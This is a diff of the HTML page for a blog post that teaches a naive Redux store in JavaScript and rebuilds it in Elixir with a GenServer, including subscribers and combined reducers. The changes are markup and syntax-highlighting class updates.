@@ -3,6 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1'/>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Hostile Developer - Something Useless - Redux Implemented in Elixir</title>
   <link href="/stylesheets/application.css" rel="stylesheet" type="text/css" />
   <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
@@ -12,32 +13,24 @@
   <section id="header">
   <header>
 <a href="/">        <h1 class="brand"><span class="hostile">Hostile</span> Developer</h1>
-
-        <h3 class="tag-line">I am Steven. Hear me Rant.</h3>
+        <h4 class="tag-line">I am Steven. Hear me Rant.</h4>
 </a>  </header>
 
   <section class='social'>
     <a target="_blank" href="http://twitter.com/_StevenNunez/"><i class="fa fa-twitter"></i></a>
     <a target="_blank" href="https://github.com/StevenNunez/"><i class="fa fa-github"></i></a>
   </section>
-  <nav>
-    <ul class='links'>
-      <li><a href="/">Home</a></li>
-    </ul>
-  </nav>
 </section>
 
 
-  <main id='articles' role="main">
+  <main id='article' role="main">
     <h1 class="article-title"><a href="/2017/04/18/something-useless-redux-implemented-in-elixir.html">Something Useless - Redux Implemented in Elixir</a></h1>
-    <h1>Something completely useless - Redux Implemented in Elixir</h1>
-
-<p>I got a chance to teach <a href="http://redux.js.org/">Redux</a> recently and what a time! For something so simple, it sure can get complicated. If you take a look at my <a href="/2014/04/13/closures.html">previous articles</a> you might notice a technique I use to get my head around concepts. Bring that bad boy on to my own turf.</p>
+    <p>I got a chance to teach <a href="http://redux.js.org/">Redux</a> recently and what a time! For something so simple, it sure can get complicated. If you take a look at my <a href="/2014/04/13/closures.html">previous articles</a> you might notice a technique I use to get my head around concepts. Bring that bad boy on to my own turf.</p>
 
 <p><img src="https://media.giphy.com/media/OhQBBFi64Z81a/giphy.gif" /></p>
 
 <p>A naïve implementation of Redux using JavaScript might look something like this:</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -74,8 +67,8 @@
 35
 36
 37
-</pre></td><td class="rouge-code"><pre><span class="kr">const</span> <span class="nx">initializerAction</span> <span class="o">=</span> <span class="p">{</span><span class="na">type</span><span class="p">:</span> <span class="s2">"@@INIT"</span><span class="p">}</span>
-<span class="kr">const</span> <span class="nx">createStore</span> <span class="o">=</span> <span class="p">(</span><span class="nx">reducer</span><span class="p">,</span> <span class="nx">state</span><span class="o">=</span><span class="kc">undefined</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">initializerAction</span> <span class="o">=</span> <span class="p">{</span><span class="na">type</span><span class="p">:</span> <span class="s2">"@@INIT"</span><span class="p">}</span>
+<span class="kd">const</span> <span class="nx">createStore</span> <span class="o">=</span> <span class="p">(</span><span class="nx">reducer</span><span class="p">,</span> <span class="nx">state</span><span class="o">=</span><span class="kc">undefined</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
 <span class="nx">state</span> <span class="o">=</span> <span class="nx">reducer</span><span class="p">(</span><span class="nx">state</span><span class="p">,</span> <span class="nx">initializerAction</span><span class="p">)</span>
 <span class="kd">let</span> <span class="nx">subscribers</span> <span class="o">=</span> <span class="p">[]</span>
   <span class="k">return</span> <span class="p">{</span>
@@ -95,7 +88,7 @@
   <span class="p">}</span>
 <span class="p">}</span>
 
-<span class="kr">const</span> <span class="nx">countReducer</span> <span class="o">=</span> <span class="p">(</span><span class="nx">state</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="nx">action</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+<span class="kd">const</span> <span class="nx">countReducer</span> <span class="o">=</span> <span class="p">(</span><span class="nx">state</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="nx">action</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
   <span class="k">switch</span><span class="p">(</span><span class="nx">action</span><span class="p">.</span><span class="nx">type</span><span class="p">){</span>
     <span class="k">case</span> <span class="s2">"INCREMENT"</span><span class="p">:</span>
       <span class="k">return</span> <span class="nx">state</span> <span class="o">+</span> <span class="mi">1</span>
@@ -103,22 +96,21 @@
       <span class="k">return</span> <span class="nx">state</span>
   <span class="p">}</span>
 <span class="p">}</span>
-<span class="kr">const</span> <span class="nx">store</span> <span class="o">=</span> <span class="nx">createStore</span><span class="p">(</span><span class="nx">countReducer</span><span class="p">)</span>
-<span class="kr">const</span> <span class="nx">removeSubscriber</span> <span class="o">=</span> <span class="nx">store</span><span class="p">.</span><span class="nx">subscribe</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"I got called"</span><span class="p">,</span> <span class="nx">store</span><span class="p">.</span><span class="nx">getState</span><span class="p">()))</span>
+<span class="kd">const</span> <span class="nx">store</span> <span class="o">=</span> <span class="nx">createStore</span><span class="p">(</span><span class="nx">countReducer</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">removeSubscriber</span> <span class="o">=</span> <span class="nx">store</span><span class="p">.</span><span class="nx">subscribe</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"I got called"</span><span class="p">,</span> <span class="nx">store</span><span class="p">.</span><span class="nx">getState</span><span class="p">()))</span>
 <span class="nx">store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">({</span><span class="na">type</span><span class="p">:</span> <span class="s2">"INCREMENT"</span><span class="p">})</span>
 <span class="c1">// Should log "I got called: 1"</span>
 
 <span class="nx">removeSubscriber</span><span class="p">()</span>
 <span class="nx">store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">({</span><span class="na">type</span><span class="p">:</span> <span class="s2">"INCREMENT"</span><span class="p">})</span>
 <span class="c1">// Should log nothing"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Cool. So we can build out a store that calls a single reducer. The store can notify subscribers of changes. We&rsquo;ll work on implementing this in Elixir, and we&rsquo;ll even handle the case with combined reducers. Along the way, we&rsquo;ll see where the JavaScript implementation falters, blocking execution of independent reducers and how to get around that in Elixir.</p>
 
 <h1>Let&rsquo;s dream</h1>
 
 <p>The code of my dreams looks something like:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -142,15 +134,14 @@
 <span class="no">Store</span><span class="o">.</span><span class="n">remove_subscriber</span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="n">subscriber_ref</span><span class="p">)</span>
 <span class="no">Store</span><span class="o">.</span><span class="n">dispatch</span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="p">%{</span><span class="ss">type:</span> <span class="sd">"</span><span class="s2">INCREMENT"</span><span class="p">})</span>
 <span class="c1"># Should log nothing"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>We swapped out a few things. This is Elixir so we&rsquo;re passing in a reference to the <code>Store</code> pid on every invocation. We also changed how we unsubscribe from a store, returning a reference value instead of a function that magically calls in the right scope. Also, we pass the current state to the subscribers on every call. This looks great, but how do we build it?</p>
 
 <h2>Enter the GenServer</h2>
 
 <p>I <em>love</em> the Erlang lords for creating the GenServer. It works for EVERYTHING.
 Let&rsquo;s start by implementing the <code>get_state</code> function on a <code>Store</code> process.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -194,8 +185,7 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
     <span class="p">{</span><span class="ss">:reply</span><span class="p">,</span> <span class="no">Map</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="ss">:store_state</span><span class="p">),</span> <span class="n">state</span><span class="p">}</span>
   <span class="k">end</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>The code above will use the <code>apply</code> function to dispatch a message to a module. If our reducer is a module named <code>CountReducer</code>, it would call <code>CountReducer.reduce(state, action)</code>. Pretty nice.</p>
 
 <p>The reducer will be a module with a <code>reduce/2</code> function. Reducers have a few responsibilities.
@@ -204,7 +194,7 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 * They ignore messages it doesn&rsquo;t care for</p>
 
 <p>The Reducers don&rsquo;t care what the state is, all they do is get state, and an action, then respond with new state. Here&rsquo;s a sample reducer:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -228,14 +218,13 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="k">defp</span> <span class="n">do_reduce</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="p">%{</span><span class="ss">type:</span> <span class="sd">"</span><span class="s2">INCREMENT"</span><span class="p">}),</span> <span class="k">do</span><span class="p">:</span> <span class="n">state</span> <span class="o">+</span> <span class="m">1</span>
   <span class="k">defp</span> <span class="n">do_reduce</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">_</span><span class="p">),</span> <span class="k">do</span><span class="p">:</span> <span class="n">state</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>We first create a <code>behaviour</code> to ensure anyone that plays the <code>Reducer</code> role knows how to do the job. We need it to have a <code>reduce/2</code> function to support the <code>Store</code> module&rsquo;s expectation. The rest is just some good old fashioned PATTERN MATCHING. The first 2 <code>reduce/2</code> heads are just clean up. If we get a nil value, then just call it again with a 0, our <code>do_reduce/2</code> functions are where the actual reducing happens.</p>
 
 <h2>Time to run it</h2>
 
 <p>Throw all of that in a file named <code>e_dux.exs</code> a open up <code>iex</code>.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -243,10 +232,9 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 
 <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="n">store</span><span class="p">}</span> <span class="o">=</span> <span class="no">Store</span><span class="o">.</span><span class="n">start_link</span><span class="p">(</span><span class="no">CountReducer</span><span class="p">)</span>
 <span class="no">Store</span><span class="o">.</span><span class="n">get_state</span><span class="p">(</span><span class="n">store</span><span class="p">)</span> <span class="c1"># =&gt; 0</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Not too exciting. Let&rsquo;s add the ability to <code>dispatch</code> an action. Back in our <code>Store</code>:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -272,10 +260,9 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
     <span class="n">store_state</span> <span class="o">=</span> <span class="n">apply</span><span class="p">(</span><span class="n">reducer</span><span class="p">,</span> <span class="ss">:reduce</span><span class="p">,</span> <span class="p">[</span><span class="n">store_state</span><span class="p">,</span> <span class="n">action</span><span class="p">])</span>
     <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="no">Map</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="ss">:store_state</span><span class="p">,</span> <span class="n">store_state</span><span class="p">)}</span>
   <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Here we cast asynchronously using <code>GenServer.cast/2</code>. This strategy makes it so our dispatch code won&rsquo;t block our calling code. Imagine if a reducer took a long time to finish. Or better yet, imagine if we have to run through several reducers? This not blocking takes advantage of Elixir&rsquo;s real power: Concurrency. Try this out by loading the file like before and run this:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -287,14 +274,13 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 <span class="no">Store</span><span class="o">.</span><span class="n">get_state</span><span class="p">(</span><span class="n">store</span><span class="p">)</span> <span class="c1"># =&gt; 0</span>
 <span class="no">Store</span><span class="o">.</span><span class="n">dispatch</span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="p">%{</span><span class="ss">type:</span> <span class="sd">"</span><span class="s2">INCREMENT"</span><span class="p">})</span>
 <span class="no">Store</span><span class="o">.</span><span class="n">get_state</span><span class="p">(</span><span class="n">store</span><span class="p">)</span> <span class="c1"># =&gt; 1</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>WOOT! Got some <code>INCREMENT</code> action! Let&rsquo;s move on to adding subscribers and notifying them.</p>
 
 <h2>I&rsquo;d like to subscribe to your newsletter</h2>
 
 <p>Back to our dream code:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -318,12 +304,11 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 <span class="no">Store</span><span class="o">.</span><span class="n">remove_subscriber</span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="n">subscriber_ref</span><span class="p">)</span>
 <span class="no">Store</span><span class="o">.</span><span class="n">dispatch</span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="p">%{</span><span class="ss">type:</span> <span class="sd">"</span><span class="s2">INCREMENT"</span><span class="p">})</span>
 <span class="c1"># Should log nothing"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>We want a <code>dispatch</code> to notify our existing subscribers after we&rsquo;ve updated our state. We&rsquo;ll also have our <code>store</code> track its subscribers. We&rsquo;ll be updating <code>init/1</code>, as well as adding <code>subscribe/2</code> and <code>remove_subscriber/2</code></p>
 
 <h3>init/1</h3>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -331,12 +316,11 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="n">store_state</span> <span class="o">=</span> <span class="n">apply</span><span class="p">(</span><span class="n">reducer</span><span class="p">,</span> <span class="ss">:reduce</span><span class="p">,</span> <span class="p">[</span><span class="n">initial_state</span><span class="p">,</span> <span class="nv">@initializer_action</span><span class="p">])</span>
   <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="p">%{</span><span class="ss">reducer:</span> <span class="n">reducer</span><span class="p">,</span> <span class="ss">store_state:</span> <span class="n">store_state</span><span class="p">,</span> <span class="ss">subscribers:</span> <span class="p">%{}}}</span> <span class="c1"># add new subscribers map to state</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Here we add a new key to our state map: subscribers. We&rsquo;ll be taking advantage of this being a map when we delete subscribers in <code>remove_subscriber/2</code></p>
 
 <h3>subscribe/2 remove_subscriber/2 and call backs</h3>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -374,12 +358,11 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="n">subscribers</span> <span class="o">=</span> <span class="no">Map</span><span class="o">.</span><span class="n">delete</span><span class="p">(</span><span class="n">subscribers</span><span class="p">,</span> <span class="n">ref</span><span class="p">)</span>
   <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="no">Map</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="ss">:subscribers</span><span class="p">,</span> <span class="n">subscribers</span><span class="p">)}</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Our <code>subscribe/2</code> function will add our subscriber to our map, storing a <code>ref</code> as the key. Since a ref is a unique value, it&rsquo;s a great way to well&hellip; reference stuff. We&rsquo;ll return that <code>ref</code> to our caller. <code>remove_subscriber/2</code> takes a <code>store</code> pid and a <code>ref</code>. This updates our <code>subscriber</code> map. This is done in a <code>cast</code> since we don&rsquo;t care about the return value.</p>
 
 <h3>dispatch/2</h3>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -389,12 +372,11 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="n">for</span> <span class="p">{</span><span class="n">_ref</span><span class="p">,</span> <span class="n">sub</span><span class="p">}</span> <span class="o">&lt;-</span> <span class="n">subscribers</span><span class="p">,</span> <span class="k">do</span><span class="p">:</span> <span class="n">sub</span><span class="o">.</span><span class="p">(</span><span class="n">store_state</span><span class="p">)</span> <span class="c1"># notify those subscribers</span>
   <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="no">Map</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="ss">:store_state</span><span class="p">,</span> <span class="n">store_state</span><span class="p">)}</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>FINALLY we update <code>handle_cast/2</code> for our <code>dispatch/2</code> function to call every subscriber.</p>
 
 <p>With this code, our dreams are ALIVE!</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -418,12 +400,11 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 <span class="no">Store</span><span class="o">.</span><span class="n">remove_subscriber</span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="n">subscriber_ref</span><span class="p">)</span>
 <span class="no">Store</span><span class="o">.</span><span class="n">dispatch</span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="p">%{</span><span class="ss">type:</span> <span class="sd">"</span><span class="s2">INCREMENT"</span><span class="p">})</span>
 <span class="c1"># Should log nothing"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <h2>Combined Reducers</h2>
 
 <p>So Redux lets you break down complex logic into multiple reducers. Something like:</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -432,19 +413,18 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 7
 8
 9
-</pre></td><td class="rouge-code"><pre><span class="kr">const</span> <span class="nx">rootReducer</span> <span class="o">=</span> <span class="nx">combineReducers</span><span class="p">({</span>
+</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">rootReducer</span> <span class="o">=</span> <span class="nx">combineReducers</span><span class="p">({</span>
   <span class="na">count</span><span class="p">:</span> <span class="nx">countReducer</span><span class="p">,</span>
   <span class="na">square</span><span class="p">:</span> <span class="nx">squareReducer</span>
 <span class="p">})</span>
 
-<span class="kr">const</span> <span class="nx">store</span> <span class="o">=</span> <span class="nx">createStore</span><span class="p">(</span><span class="nx">rootReducer</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">store</span> <span class="o">=</span> <span class="nx">createStore</span><span class="p">(</span><span class="nx">rootReducer</span><span class="p">)</span>
 <span class="nx">store</span><span class="p">.</span><span class="nx">getState</span><span class="p">()</span> <span class="c1">// {count: 0, square: 2} // default to 2 so we can get some good squaring action</span>
 <span class="nx">store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">({</span><span class="na">type</span><span class="p">:</span> <span class="s2">"INCREMENT"</span><span class="p">})</span>
 <span class="nx">store</span><span class="p">.</span><span class="nx">getState</span><span class="p">()</span> <span class="c1">// {count: 1, square: 4}</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Internally all a combined reducer is is a reducer that delegates to other reducers. More naive code:</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -473,7 +453,7 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 27
 28
 29
-</pre></td><td class="rouge-code"><pre><span class="kr">const</span> <span class="nx">combineReducers</span> <span class="o">=</span> <span class="p">(</span><span class="nx">reducerMap</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">combineReducers</span> <span class="o">=</span> <span class="p">(</span><span class="nx">reducerMap</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
   <span class="k">return</span> <span class="p">(</span><span class="nx">state</span><span class="p">,</span> <span class="nx">action</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
     <span class="k">return</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">reducerMap</span><span class="p">).</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">map</span><span class="p">,</span> <span class="nx">stateName</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
       <span class="nx">map</span><span class="p">[</span><span class="nx">stateName</span><span class="p">]</span> <span class="o">=</span> <span class="nx">reducerMap</span><span class="p">[</span><span class="nx">stateName</span><span class="p">](</span><span class="nx">state</span><span class="p">[</span><span class="nx">stateName</span><span class="p">],</span> <span class="nx">action</span><span class="p">)</span>
@@ -482,7 +462,7 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="p">}</span>
 <span class="p">}</span>
 
-<span class="kr">const</span> <span class="nx">countReducer</span> <span class="o">=</span> <span class="p">(</span><span class="nx">state</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="nx">action</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+<span class="kd">const</span> <span class="nx">countReducer</span> <span class="o">=</span> <span class="p">(</span><span class="nx">state</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="nx">action</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
   <span class="k">switch</span> <span class="p">(</span><span class="nx">action</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">case</span> <span class="s2">"INCREMENT"</span><span class="p">:</span>
       <span class="k">return</span> <span class="nx">state</span> <span class="o">+</span> <span class="mi">1</span>
@@ -491,7 +471,7 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="p">}</span>
 <span class="p">}</span>
 
-<span class="kr">const</span> <span class="nx">squareReducer</span> <span class="o">=</span> <span class="p">(</span><span class="nx">state</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="nx">action</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+<span class="kd">const</span> <span class="nx">squareReducer</span> <span class="o">=</span> <span class="p">(</span><span class="nx">state</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="nx">action</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
   <span class="k">switch</span> <span class="p">(</span><span class="nx">action</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">case</span> <span class="s2">"INCREMENT"</span><span class="p">:</span>
       <span class="k">return</span> <span class="nx">state</span> <span class="o">*</span> <span class="nx">state</span>
@@ -500,16 +480,15 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="p">}</span>
 <span class="p">}</span>
 
-<span class="kr">const</span> <span class="nx">rootReducer</span> <span class="o">=</span> <span class="nx">combineReducers</span><span class="p">({</span><span class="na">count</span><span class="p">:</span> <span class="nx">countReducer</span><span class="p">,</span> <span class="na">square</span><span class="p">:</span> <span class="nx">squareReducer</span><span class="p">})</span>
+<span class="kd">const</span> <span class="nx">rootReducer</span> <span class="o">=</span> <span class="nx">combineReducers</span><span class="p">({</span><span class="na">count</span><span class="p">:</span> <span class="nx">countReducer</span><span class="p">,</span> <span class="na">square</span><span class="p">:</span> <span class="nx">squareReducer</span><span class="p">})</span>
 <span class="nx">rootReducer</span><span class="p">({</span><span class="na">count</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="na">square</span><span class="p">:</span> <span class="mi">2</span><span class="p">},</span> <span class="p">{</span><span class="na">type</span><span class="p">:</span> <span class="s2">"INCREMENT"</span><span class="p">})</span> <span class="c1">// {count: 1, square: 4}</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Here we return a function that when called with a state and action will delegate portions of the state to specific reducers. Pretty nice! But something wicked lies in this code. When our reducer dispatches, it can only delegate to one reducer at a time, even though their state is completely isolated. This would be a perfect time for some concurrency! Let&rsquo;s look at how we can handle this in Elixir.</p>
 
 <h3>CombineReducer Module</h3>
 
 <p>We&rsquo;ll start out with a change to how treat individual reducers vs a Map with reducers. Above our existing <code>init/1</code> function, add this:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -533,12 +512,11 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="n">store_state</span> <span class="o">=</span> <span class="n">apply</span><span class="p">(</span><span class="n">reducer</span><span class="p">,</span> <span class="ss">:reduce</span><span class="p">,</span> <span class="p">[</span><span class="n">initial_state</span><span class="p">,</span> <span class="nv">@initializer_action</span><span class="p">])</span>
   <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="p">%{</span><span class="ss">reducer:</span> <span class="n">reducer</span><span class="p">,</span> <span class="ss">store_state:</span> <span class="n">store_state</span><span class="p">,</span> <span class="ss">subscribers:</span> <span class="p">%{}}}</span> <span class="c1"># add new subscribers map to state</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Converting nil values to an empty map will let our reducers receive <code>nil</code> as their state when we call something like <code>state[:count]</code>. They&rsquo;ll then convert that to their expected default state.</p>
 
 <p>One small change to <code>dispatch/2</code> to support our reducer potentially being a map instead of a module:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -564,10 +542,9 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="n">for</span> <span class="p">{</span><span class="n">_ref</span><span class="p">,</span> <span class="n">sub</span><span class="p">}</span> <span class="o">&lt;-</span> <span class="n">subscribers</span><span class="p">,</span> <span class="k">do</span><span class="p">:</span> <span class="n">sub</span><span class="o">.</span><span class="p">(</span><span class="n">store_state</span><span class="p">)</span> <span class="c1"># notify those subscribers</span>
   <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="no">Map</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="ss">:store_state</span><span class="p">,</span> <span class="n">store_state</span><span class="p">)}</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>And finally, our brand new module a brand new module to handle our CombineReducers logic.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
